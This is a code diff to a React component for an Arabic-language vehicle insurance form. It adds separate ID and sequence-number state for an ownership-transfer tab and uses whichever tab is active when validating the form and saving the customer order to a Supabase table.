@@ -18,9 +18,12 @@ const Hero = () => {
   const navigate = useNavigate();
   const { updateOrderData } = useOrder();
   const sessionId = useVisitorTracking();
+  const [activeTab, setActiveTab] = useState("new");
   const [idNumber, setIdNumber] = useState("");
   const [sequenceNumber, setSequenceNumber] = useState("");
   const [birthDate, setBirthDate] = useState<Date>();
+  const [transferIdNumber, setTransferIdNumber] = useState("");
+  const [transferSequenceNumber, setTransferSequenceNumber] = useState("");
   const [transferBirthDate, setTransferBirthDate] = useState<Date>();
   const [cardType, setCardType] = useState<"form" | "customs" | null>(null);
   const [transferCardType, setTransferCardType] = useState<"form" | "customs" | null>(null);
@@ -59,25 +62,34 @@ const Hero = () => {
   };
 
   const handleNext = async () => {
-    if (!idNumber || !sequenceNumber || !birthDate) {
+    // Determine which tab is active and validate accordingly
+    const isTransferTab = activeTab === "transfer";
+    
+    const currentIdNumber = isTransferTab ? transferIdNumber : idNumber;
+    const currentSequenceNumber = isTransferTab ? transferSequenceNumber : sequenceNumber;
+    const currentBirthDate = isTransferTab ? transferBirthDate : birthDate;
+    const currentPhoneNumber = isTransferTab ? transferPhoneNumber : phoneNumber;
+    const currentOwnerName = isTransferTab ? transferOwnerName : ownerName;
+    
+    if (!currentIdNumber || !currentSequenceNumber || !currentBirthDate) {
       toast.error("يرجى ملء جميع الحقول المطلوبة");
       return;
     }
 
-    if (phoneNumber.length !== 10 || !phoneNumber.startsWith('05')) {
+    if (currentPhoneNumber.length !== 10 || !currentPhoneNumber.startsWith('05')) {
       toast.error("رقم الهاتف يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
       return;
     }
 
-    const formattedBirthDate = format(birthDate, "yyyy-MM-dd");
+    const formattedBirthDate = format(currentBirthDate, "yyyy-MM-dd");
     
     // Update context
     updateOrderData({
-      idNumber,
-      sequenceNumber,
+      idNumber: currentIdNumber,
+      sequenceNumber: currentSequenceNumber,
       birthDate: formattedBirthDate,
-      phoneNumber,
-      ownerName,
+      phoneNumber: currentPhoneNumber,
+      ownerName: currentOwnerName,
     });
 
     // Check if order exists, if not create it
@@ -101,7 +113,7 @@ const Hero = () => {
       const { data: existingOrder } = await supabase
         .from("customer_orders")
         .select("id")
-        .eq("sequence_number", sequenceNumber)
+        .eq("sequence_number", currentSequenceNumber)
         .maybeSingle();
 
       if (!existingOrder) {
@@ -109,11 +121,11 @@ const Hero = () => {
         await supabase
           .from("customer_orders")
           .insert({
-            id_number: idNumber,
-            sequence_number: sequenceNumber,
+            id_number: currentIdNumber,
+            sequence_number: currentSequenceNumber,
             birth_date: formattedBirthDate,
-            phone_number: phoneNumber,
-            owner_name: ownerName,
+            phone_number: currentPhoneNumber,
+            owner_name: currentOwnerName,
             vehicle_type: "",
             vehicle_purpose: "",
             insurance_company: "",
@@ -131,13 +143,13 @@ const Hero = () => {
         await supabase
           .from("customer_orders")
           .update({
-            id_number: idNumber,
+            id_number: currentIdNumber,
             birth_date: formattedBirthDate,
-            phone_number: phoneNumber,
-            owner_name: ownerName,
+            phone_number: currentPhoneNumber,
+            owner_name: currentOwnerName,
             visitor_ip: visitorIp,
           })
-          .eq("sequence_number", sequenceNumber);
+          .eq("sequence_number", currentSequenceNumber);
       }
     } catch (error) {
       console.error("Error saving order:", error);
@@ -166,7 +178,7 @@ const Hero = () => {
       <div className="container mx-auto px-4 py-12">
         <div className="max-w-2xl mx-auto animate-scale-in">
           <div className="bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
-            <Tabs defaultValue="new" dir="rtl" className="w-full">
+            <Tabs defaultValue="new" dir="rtl" className="w-full" value={activeTab} onValueChange={setActiveTab}>
               <TabsList className="grid w-full grid-cols-2 mb-6">
                 <TabsTrigger value="new" className="text-base">تأمين جديد</TabsTrigger>
                 <TabsTrigger value="transfer" className="text-base">نقل ملكية</TabsTrigger>
@@ -295,6 +307,11 @@ const Hero = () => {
                     pattern="[0-9]*"
                     inputMode="numeric"
                     className="h-12 text-base"
+                    value={transferIdNumber}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      setTransferIdNumber(value);
+                    }}
                   />
                 </div>
 
@@ -363,6 +380,11 @@ const Hero = () => {
                     pattern="[0-9]*"
                     inputMode="numeric"
                     className="h-12 text-base text-center"
+                    value={transferSequenceNumber}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '');
+                      setTransferSequenceNumber(value);
+                    }}
                   />
                 </div>
 
